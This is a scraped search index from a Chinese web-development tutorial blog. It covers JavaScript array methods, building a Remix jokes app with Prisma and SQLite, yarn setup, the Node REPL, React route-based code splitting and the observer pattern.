19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  // 全局变量 const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;Director\u0026#34;: \u0026#34;Christopher Nolan\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34; }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;Director\u0026#34;: \u0026#34;Christopher Nolan\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;9.0\u0026#34; } ]; function getRating(watchList) { let averageRating = watchList // 使用过滤器查找克里斯托弗·诺兰 (Christopher Nolan) 导演的电影  .filter(film =\u0026gt; film.Director === \u0026#34;Christopher Nolan\u0026#34;) // 使用 map 将他们的评分从字符串转换为数字  .map(film =\u0026gt; Number(film.imdbRating)) // 使用 reduce 将他们的评分加在一起  .reduce((sumOfRatings, rating) =\u0026gt; sumOfRatings + rating) / // 除以诺兰片数得到平均评分  watchList.filter(film =\u0026gt; film.Director === \u0026#34;Christopher Nolan\u0026#34;).length; return averageRating; } console.log(getRating(watchList)); // 8.9   \r使用高阶函数 map、filter 或者 reduce 来解决复杂问题 已经接触了高阶函数如 map()、 filter() 和 reduce()的使用，是时候用它们来完成一些复杂的挑战了。\n使用 map()、filter() 和 reduce() 的任何组合完成 squareList 函数的代码。\n传递一个包含实数的数组给函数时，函数应返回一个新的数组，只包含正整数（小数不是整数）的平方值， 例如 [-3, 4.8, 5, 3, -3.2] 这样一个包含实数的数组。\n注意： 函数不应该包含任何形式的 for 或者 while 循环或者 forEach() 函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  const squareList = arr =\u0026gt; { // return arr  // .filter(num =\u0026gt; num \u0026gt; 0 \u0026amp;\u0026amp; num % parseInt(num) === 0)  // .map(num =\u0026gt; Math.pow(num, 2));  // 或者  return arr.reduce((sqrIntegers, num) =\u0026gt; { return Number.isInteger(num) \u0026amp;\u0026amp; num \u0026gt; 0 ? sqrIntegers.concat(num * num) : sqrIntegers; }, []); }; const squaredIntegers = squareList([-3, 4.8, 5, 3, -3.2]); console.log(squaredIntegers); // [ 25, 9 ]   ","description":"reduce() 方法按顺序在数组的每个元素上执行用户提供的“reducer”回调函数，并传入对前一个元素进行计算的返回值。 在数组的所有元素上运行 reducer 的最终结果是单个值。","id":94,"section":"javascript","tags":null,"title":"Array.prototype.reduce()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/reduce-programming/"},{"content":"一、创建 Remix 项目 npx create-remix@latest\ryarn\ryarn dev 二、目录结构   app/ - 所有Remix应用程序代码的位置\n  app/entry.client.tsx- JavaScript 的第一部分，它将在应用程序在浏览器中加载时运行。我们使用此文件来补充我们的 React 组件。\n  app/entry.server.tsx- JavaScript 的第一部分，当请求到达您的服务器时，它将运行。Remix 处理加载所有必要的数据，您负责发回响应。我们将使用此文件将 React 应用呈现为字符串/流，并将其作为响应发送给客户端。\n  app/root.tsx- 应用程序放置根组件的位置。在此处呈现元素。\n  app/routes/- 所有\u0026quot;路由模块\u0026quot;的位置。Remix 使用此目录中的文件根据文件的名称为应用创建 URL 路由。\n  public/ - 静态资产（图像/字体/等）的位置\n  remix.config.js - Remix有一些配置选项，您可以在此文件中设置。\n  三、路由（编程式/文件式） 1.这里使用文件式路由\n app/routes/index.tsx\n export default function IndexRoute() {\rreturn \u0026lt;div\u0026gt;Hello Index Route\u0026lt;/div\u0026gt;;\r} 2. 子路由（嵌套路由）\n app/root.tsx\n import { LiveReload, Outlet } from \u0026#34;remix\u0026#34;;\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026#34;utf-8\u0026#34; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it\u0026#39;s funny!\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026#34;development\u0026#34; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r}  app/routes/jokes/index.tsx\n export default function JokesIndexRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rI was wondering why the frisbee was getting bigger,\rthen it hit me.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}  app/routes/jokes/new.tsx\n export default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026#34;content\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 3.动态路由（参数化路由）\n app/routes/jokes/$jokeId.tsx\n export default function JokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rWhy don\u0026#39;t you find hippopotamuses hiding in trees?\rThey\u0026#39;re really good at it.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 四、样式  全局样式   app/root.tsx\n import type { LinksFunction } from \u0026#34;remix\u0026#34;;\rimport { Links, LiveReload, Outlet } from \u0026#34;remix\u0026#34;;\rimport globalStylesUrl from \u0026#34;./styles/global.css\u0026#34;;\rimport globalMediumStylesUrl from \u0026#34;./styles/global-medium.css\u0026#34;;\rimport globalLargeStylesUrl from \u0026#34;./styles/global-large.css\u0026#34;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalStylesUrl\r},\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalMediumStylesUrl,\rmedia: \u0026#34;print, (min-width: 640px)\u0026#34;\r},\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: globalLargeStylesUrl,\rmedia: \u0026#34;screen and (min-width: 1024px)\u0026#34;\r}\r];\r};\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026#34;utf-8\u0026#34; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it\u0026#39;s funny!\u0026lt;/title\u0026gt;\r\u0026lt;Links /\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026#34;development\u0026#34; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r} 组件样式 (需要在root.tsx中调用组件才能渲染)   app/routes/index.tsx\n import type { LinksFunction } from \u0026#34;remix\u0026#34;;\rimport { Link } from \u0026#34;remix\u0026#34;;\rimport stylesUrl from \u0026#34;../styles/index.css\u0026#34;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026#34;stylesheet\u0026#34;,\rhref: stylesUrl\r}\r];\r};\rexport default function Index() {\rreturn (\r\u0026lt;div className=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;content\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;\rRemix \u0026lt;span\u0026gt;Jokes!\u0026lt;/span\u0026gt;\r\u0026lt;/h1\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026#34;jokes\u0026#34;\u0026gt;Read Jokes\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 五、数据库 （这里使用Prisma ORM 和 SQLite 数据库） Step1. 安装 Prisma\n 为 Prisma 安装 VSCode 插件\n yarn add --dev prisma //用于在开发过程中与我们的数据库和schema进行交互\ryarn add @prisma/client //用于在运行时对我们的数据库进行查询 Step2. 用 SQLite 初始化 Prisma\nnpx prisma init --datasource-provider sqlite Step3. 为数据建模\n prisma/schema.prisma\n generator client {\rprovider = \u0026#34;prisma-client-js\u0026#34;\r}\rdatasource db {\rprovider = \u0026#34;sqlite\u0026#34;\rurl = env(\u0026#34;DATABASE_URL\u0026#34;)\r}\rmodel Joke {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r} Step4. 推送数据模型到 SQLite\n 如果您的数据库搞砸了，您可以随时删除该prisma/dev.db文件并npx prisma db push再次运行。\n npx prisma db push Step5. 禁止 dev.db 提交到 github\n .gitignore\n /prisma/dev.db\r.env Step6. 测试数据填充数据库\n prisma/seed.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rconst db = new PrismaClient();\rasync function seed() {\rawait Promise.all(\rgetJokes().map(joke =\u0026gt; {\rreturn db.joke.create({ data: joke });\r})\r);\r}\rseed();\rfunction getJokes() {\r// shout-out to https://icanhazdadjoke.com/\rreturn [\r{\rname: \u0026#34;Road worker\u0026#34;,\rcontent: `I never wanted to believe that my Dad was stealing from his job as a road worker. But when I got home, all the signs were there.`\r},\r{\rname: \u0026#34;Frisbee\u0026#34;,\rcontent: `I was wondering why the frisbee was getting bigger, then it hit me.`\r},\r{\rname: \u0026#34;Trees\u0026#34;,\rcontent: `Why do trees seem suspicious on sunny days? Dunno, they\u0026#39;re just a bit shady.`\r},\r{\rname: \u0026#34;Skeletons\u0026#34;,\rcontent: `Why don\u0026#39;t skeletons ride roller coasters? They don\u0026#39;t have the stomach for it.`\r},\r{\rname: \u0026#34;Hippos\u0026#34;,\rcontent: `Why don\u0026#39;t you find hippopotamuses hiding in trees? They\u0026#39;re really good at it.`\r},\r{\rname: \u0026#34;Dinner\u0026#34;,\rcontent: `What did one plate say to the other plate? Dinner is on me!`\r},\r{\rname: \u0026#34;Elevator\u0026#34;,\rcontent: `My first time using an elevator was an uplifting experience. The second time let me down.`\r}\r];\r}  安装esbuild-register为开发依赖项：\n yarn add --dev esbuild-register  运行 seed.ts 文件\n node --require esbuild-register prisma/seed.ts  将此添加到package.json,避免每次重置数据都必须记住该脚本\n // ...\r\u0026#34;prisma\u0026#34;: {\r\u0026#34;seed\u0026#34;: \u0026#34;node --require esbuild-register prisma/seed.ts\u0026#34;\r},\r\u0026#34;scripts\u0026#34;: {\r// ... Step7. 连接到数据库\n prisma/seed.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rconst db = new PrismaClient();  创建 app/utils/db.server.ts\n import { PrismaClient } from \u0026#34;@prisma/client\u0026#34;;\rlet db: PrismaClient;\rdeclare global {\rvar __db: PrismaClient | undefined;\r}\r//这是必需的，因为在开发中我们不想在每次更改时都重新启动服务器，\r//但我们想确保我们也不会在每次更改时都创建到数据库的新连接。\rif (process.env.NODE_ENV === \u0026#34;production\u0026#34;) {\rdb = new PrismaClient();\rdb.$connect();\r} else {\rif (!global.__db) {\rglobal.__db = new PrismaClient();\rglobal.__db.$connect();\r}\rdb = global.__db;\r}\rexport { db }; Step8. 限制数据获取数量\n app/routes/jokes\n type LoaderData = {\rjokeListItems: Array\u0026lt;{ id: string; name: string }\u0026gt;;\r};\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst data: LoaderData = {\rjokeListItems: await db.joke.findMany({\rtake: 5,\rselect: { id: true, name: true },\rorderBy: { createdAt: \u0026#34;desc\u0026#34; }\r})\r};\rreturn data;\r}; Step9. 数据库查询\n app/routes/jokes/$jokeId.tsx\n import type { LoaderFunction } from \u0026#34;remix\u0026#34;;\rimport { Link, useLoaderData } from \u0026#34;remix\u0026#34;;\rimport type { Joke } from \u0026#34;@prisma/client\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rtype LoaderData = { joke: Joke };\rexport const loader: LoaderFunction = async ({\rparams\r}) =\u0026gt; {\rconst joke = await db.joke.findUnique({\rwhere: { id: params.jokeId }\r});\rif (!joke) throw new Error(\u0026#34;Joke not found\u0026#34;);\rconst data: LoaderData = { joke };\rreturn data;\r};\rexport default function JokeRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.joke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to=\u0026#34;.\u0026#34;\u0026gt;{data.joke.name} Permalink\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}  随机查询 app/routes/jokes/index.tsx\n import type { LoaderFunction } from \u0026#34;remix\u0026#34;;\rimport { useLoaderData, Link } from \u0026#34;remix\u0026#34;;\rimport type { Joke } from \u0026#34;@prisma/client\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rtype LoaderData = { randomJoke: Joke };\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst count = await db.joke.count();\rconst randomRowNumber = Math.floor(Math.random() * count);\rconst [randomJoke] = await db.joke.findMany({\rtake: 1,\rskip: randomRowNumber\r});\rconst data: LoaderData = { randomJoke };\rreturn data;\r};\rexport default function JokesIndexRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here\u0026#39;s a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.randomJoke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to={data.randomJoke.id}\u0026gt;\r\u0026#34;{data.randomJoke.name}\u0026#34; Permalink\r\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} Step10. 突变 （添加数据）\n app/routes/new.tsx\n import type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { redirect } from \u0026#34;remix\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026#34;name\u0026#34;);\rconst content = form.get(\u0026#34;content\u0026#34;);\r// we do this type check to be extra sure and to make TypeScript happy\r// we\u0026#39;ll explore validation next!\rif (\rtypeof name !== \u0026#34;string\u0026#34; ||\rtypeof content !== \u0026#34;string\u0026#34;\r) {\rthrow new Error(`Form not submitted correctly.`);\r}\rconst fields = { name, content };\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026#34;content\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 六、数据验证  app/routes/jokes/new.tsx\n import type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { useActionData, redirect, json } from \u0026#34;remix\u0026#34;;\rimport { db } from \u0026#34;~/utils/db.server\u0026#34;;\rfunction validateJokeContent(content: string) {\rif (content.length \u0026lt; 10) {\rreturn `That joke is too short`;\r}\r}\rfunction validateJokeName(name: string) {\rif (name.length \u0026lt; 2) {\rreturn `That joke\u0026#39;s name is too short`;\r}\r}\rtype ActionData = {\rformError?: string;\rfieldErrors?: {\rname: string | undefined;\rcontent: string | undefined;\r};\rfields?: {\rname: string;\rcontent: string;\r};\r};\rconst badRequest = (data: ActionData) =\u0026gt;\rjson(data, { status: 400 });\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026#34;name\u0026#34;);\rconst content = form.get(\u0026#34;content\u0026#34;);\rif (\rtypeof name !== \u0026#34;string\u0026#34; ||\rtypeof content !== \u0026#34;string\u0026#34;\r) {\rreturn badRequest({\rformError: `Form not submitted correctly.`\r});\r}\rconst fieldErrors = {\rname: validateJokeName(name),\rcontent: validateJokeContent(content)\r};\rconst fields = { name, content };\rif (Object.values(fieldErrors).some(Boolean)) {\rreturn badRequest({ fieldErrors, fields });\r}\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rconst actionData = useActionData\u0026lt;ActionData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName:{\u0026#34; \u0026#34;}\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rdefaultValue={actionData?.fields?.name}\rname=\u0026#34;name\u0026#34;\raria-invalid={\rBoolean(actionData?.fieldErrors?.name) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.name\r? \u0026#34;name-error\u0026#34;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.name ? (\r\u0026lt;p\rclassName=\u0026#34;form-validation-error\u0026#34;\rrole=\u0026#34;alert\u0026#34;\rid=\u0026#34;name-error\u0026#34;\r\u0026gt;\r{actionData.fieldErrors.name}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent:{\u0026#34; \u0026#34;}\r\u0026lt;textarea\rdefaultValue={actionData?.fields?.content}\rname=\u0026#34;content\u0026#34;\raria-invalid={\rBoolean(actionData?.fieldErrors?.content) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.content\r? \u0026#34;content-error\u0026#34;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.content ? (\r\u0026lt;p\rclassName=\u0026#34;form-validation-error\u0026#34;\rrole=\u0026#34;alert\u0026#34;\rid=\u0026#34;content-error\u0026#34;\r\u0026gt;\r{actionData.fieldErrors.content}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026#34;submit\u0026#34; className=\u0026#34;button\u0026#34;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 七、身份验证 Step1. prisma/schema.prisma\n// This is your Prisma schema file,\r// learn more about it in the docs: https://pris.ly/d/prisma-schema\rgenerator client {\rprovider = \u0026#34;prisma-client-js\u0026#34;\r}\rdatasource db {\rprovider = \u0026#34;sqlite\u0026#34;\rurl = env(\u0026#34;DATABASE_URL\u0026#34;)\r}\rmodel User {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rusername String @unique\rpasswordHash String\rjokes Joke[]\r}\rmodel Joke {\rid String @id @default(uuid())\rjokesterId String\rjokester User @relation(fields: [jokesterId], references: [id], onDelete: Cascade)\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r} Step2. 重置数据库\nnpx prisma db push ","description":"我并不看好Remix这种类型的不伦不类的框架，所以不会再更新","id":95,"section":"react","tags":null,"title":"Remix 进阶","uri":"https://codthing.github.io/react/remix/remix-adv/"},{"content":"一、全局配置yarn Step1. 获取yarn的安装位置\nyarn global bin Step2. 配置yarn全局变量\n","description":"","id":96,"section":"others","tags":null,"title":"yarn 最佳实践","uri":"https://codthing.github.io/others/yarn/yarn-bp/"},{"content":"REPL 表示 Read Evaluate Print Loop，它是一种编程语言环境（基本上是一个控制台窗口），\n它将单个表达式作为用户输入，并在执行后将结果返回到控制台。\nREPL 会话提供了一种快速测试简单 JavaScript 代码的便捷方式。\n一、启动方式 如果没有任何脚本或任何参数的情况下运行 node 命令，将启动一个 REPL 会话：\n1 2  node   \r二、编写测试代码 1 2 3 4 5  \u0026gt; console.log(\u0026#39;test\u0026#39;) test undefined \u0026gt;   第一个值 test 告诉控制台打印的输出，然后得到 undefined，这是运行 console.log() 的返回值。 Node 读取这行代码，对其进行评估，打印结果，然后返回等待更多行代码。\nNode 会在 REPL 中执行的每段代码循环这三个步骤，直到退出会话。 这就是 REPL 得名的地方。\nNode 会自动打印任何一行 JavaScript 代码的结果，而无需指示它如何做。 例如，输入以下行并按回车键：\n1 2 3 4  \u0026gt; 5 === \u0026#39;5\u0026#39; false \u0026gt;   请注意以上两行输出的差异。 Node REPL 在执行 console.log() 后打印 undefined，而另一方面，它只是打印 5 === \u0026lsquo;5\u0026rsquo; 的结果。 需要记住，前者在 JavaScript 中只是一个语句，后者是一个表达式。\n在某些情况下，要测试的代码可能需要多行。 例如，假设要定义一个生成随机数的函数，在 REPL 会话类型中的输入以下行并按 Enter：\n1 2 3  function generateRandom() { ...   Node REPL 足够智能，可以确定还没有完成代码编写，它将进入多行模式，以便输入更多代码。 现在完成函数定义并按回车键：\n1 2 3 4 5  function generateRandom() { ...return Math.random() } undefined   Node 将退出多行模式，并打印 undefined 因为没有返回值。 这种多线模式是有限的。\n\r三、使用 Tab键 自动完成 REPL 很酷的一点是它是交互式的。\n在编写代码时，如果按下 Tab 键，REPL 将尝试自动完成编写的内容以匹配已经定义的变量或预定义的变量。\n尝试输入 JavaScript 类的名称，例如 Number，添加一个点并按 Tab。\nREPL 将打印可以在该类上访问的所有属性和方法：\n\r四、搜索全局对象 可以通过键入 global 来检查有权访问的全局变量。 并按下 Tab键：\n\r五、_ 特殊变量 如果在某些代码之后键入 _，则将打印上次操作的结果。\n\r六、向上箭头键 如果按向上箭头键，可以访问在当前甚至以前的 REPL 会话中执行的前几行代码的历史记录。\n\r七、点命令 REPL 有一些特殊的命令，都以点开头\n  .help：显示点命令帮助\n  .editor：启用编辑器模式，轻松编写多行 JavaScript 代码。 进入此模式后，输入 ctrl-D 以运行您编写的代码。\n  .break：输入多行表达式时，输入 .break 命令将中止进一步的输入。 与按 ctrl-C 相同。\n  .clear：将 REPL 上下文重置为空对象并清除当前正在输入的任何多行表达式。\n  .load：加载一个 JavaScript 文件，相对于当前工作目录\n  .save：将您在 REPL 会话中输入的所有内容保存到文件中（指定文件名）\n  .exit：退出repl（与按ctrl-C两次相同）\n  REPL 知道何时输入多行语句而无需调用 .editor。\n例如，如果开始输入这样的迭代：\n1 2  [1, 2, 3].forEach(num =\u0026gt; {   然后按 Enter，REPL 将转到以 3 个点开头的新行，表示现在可以继续处理该块。\n1 2 3  ... console.log(num) ... })   如果在行尾输入 .break ，多行模式将停止并且语句不会被执行。\n","description":"","id":97,"section":"nodejs","tags":null,"title":"使用 REPL 测试代码","uri":"https://codthing.github.io/nodejs/nodebase/node-repl/"},{"content":"可以通过添加基于路由的拆分来请求仅特定路由需要的资源。\n通过将 React Suspense 或 loadable-component 与 react-router 等库结合，可以根据当前路由动态加载组件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  import React, { lazy, Suspense } from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import { Switch, Route, BrowserRouter as Router } from \u0026#34;react-router-dom\u0026#34;; const App = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;home\u0026#34; */ \u0026#34;./App\u0026#34;)); const Overview = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;overview\u0026#34; */ \u0026#34;./Overview\u0026#34;) ); const Settings = lazy(() =\u0026gt; import(/* webpackChunkName: \u0026#34;settings\u0026#34; */ \u0026#34;./Settings\u0026#34;) ); render( \u0026lt;Router\u0026gt; \u0026lt;Suspense fallback={\u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;}\u0026gt; \u0026lt;Switch\u0026gt; \u0026lt;Route exact path=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;App /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;Route path=\u0026#34;/overview\u0026#34;\u0026gt; \u0026lt;Overview /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;Route path=\u0026#34;/settings\u0026#34;\u0026gt; \u0026lt;Settings /\u0026gt; \u0026lt;/Route\u0026gt; \u0026lt;/Switch\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/Router\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;) ); module.hot.accept();   通过延迟加载每个路由的组件，只请求包含当前路由所需代码的包。\n由于大多数人已经习惯了重定向期间可能会有一些加载时间的事实，因此它是延迟加载组件的理想场所！\n\r知识点   React Suspense\n  loadable-component\n  react-router\n  ","description":"根据当前路由动态加载组件","id":98,"section":"react-patterns","tags":null,"title":"基于路由的拆分","uri":"https://codthing.github.io/react-patterns/performance-patterns/route-base/"},{"content":"使用观察者模式，我们可以将某些对象（观察者）订阅到另一个称为 observable（可观察） 的对象。 每当一个事件发生时，observable 就会通知它所有的观察者！\n一个 observable 对象通常包含 4 个重要部分：\n observers：观察者数组，每当发生特定事件时都会收到通知 subscribe()：将观察者添加到观察者数组的方法 unsubscribe()：从观察者数组中移除观察者的方法 notify()：一种在特定事件发生时通知所有观察者的方法  \r创建一个 observable 让我们创建一个 observable！ 一种简单方法是使用 ES6 类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  class Observable { constructor() { this.observers = []; } subscribe(func) { this.observers.push(func); //push() 方法将一个或多个元素添加到数组的末尾，并返回该数组的新长度。  } unsubscribe(func) { this.observers = this.observers.filter(observer =\u0026gt; observer !== func); //filter() 方法创建一个新数组, 它返回所提供函数处理过的所有元素。  } notify(data) { this.observers.forEach(observer =\u0026gt; observer(data)); //forEach() 方法对数组的每个元素执行一次给定的函数。  } }   可以使用 subscribe 方法将观察者添加到观察者数组中，使用 unsubscribe 方法删除观察者，并使用 notify 方法通知所有订阅者。\n让我们用这个 observable（可观察） 构建一些东西。有一个非常基本的应用程序，它只包含两个组件：按钮和开关。\nexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 我们希望跟踪用户与应用程序的交互。 每当用户单击按钮或切换开关时，我们都希望使用时间戳记录此事件。 除了记录它，我们还想创建一个 Toast 通知，在事件发生时显示它！\n本质上，我们想要做的是以下内容：\n每当用户调用 handleClick 或 handleToggle 函数时，这些函数都会调用观察者上的通知方法。 notify 方法将通过 handleClick 或 handleToggle 函数传递的数据通知所有订阅者！\n首先，让我们创建 logger 和 toastify 函数。 这些函数最终会从 notify 方法接收数据。\nimport { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;;\rfunction logger(data) {\rconsole.log(`${Date.now()} ${data}`);\r}\rfunction toastify(data) {\rtoast(data);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click me!\u0026lt;/Button\u0026gt;\r\u0026lt;FormControlLabel control={\u0026lt;Switch /\u0026gt;} /\u0026gt;\r\u0026lt;ToastContainer /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 目前，logger 和 toasity 函数不知道 observable：observable 还不能通知它们！ 为了让它们成为观察者，我们必须使用 observable 上的 subscribe 方法订阅它们！\nimport { ToastContainer, toast } from \u0026#34;react-toastify\u0026#34;;\rfunction logger(data) {\rconsole.log(`${Date.now()} ${data}`);\r}\rfunction toastify(data) {\rtoast(data);\r}\robservable.subscribe(logger);\robservable.subscribe(toastify);\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Button\u0026gt;Click 